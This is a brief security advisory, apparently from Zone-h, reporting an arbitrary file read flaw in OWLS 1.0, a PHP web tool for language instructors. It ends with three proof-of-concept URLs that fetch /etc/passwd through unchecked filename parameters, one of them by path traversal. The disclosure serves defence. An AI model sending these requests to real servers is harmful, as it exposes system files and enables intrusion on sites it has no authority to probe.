Description

***********

Zone-h Security Team has discovered a flaw in OWLS 1.0. There is a vulnerability in the current version of OWLS that allows an attacker to retrieve arbitrary files from the webserver with its priviledges.
"OWLS is a web-based environment for instructors of language to easily create exercises, readings, glossaries, and present media for their students. Once installed on a web server that supports PHP,
instructors can create materials or upload media for presentation to their students through a simple form based interface"

http://address/owls/readings/index.php?filename=/etc/passwd

http://address/owls/multiplechoice/resultsignore.php?filename=/etc/passwd

http://address/owls/workshop/glossary.php?editfile=../../../../../../../../../../../../../../../etc/passwd
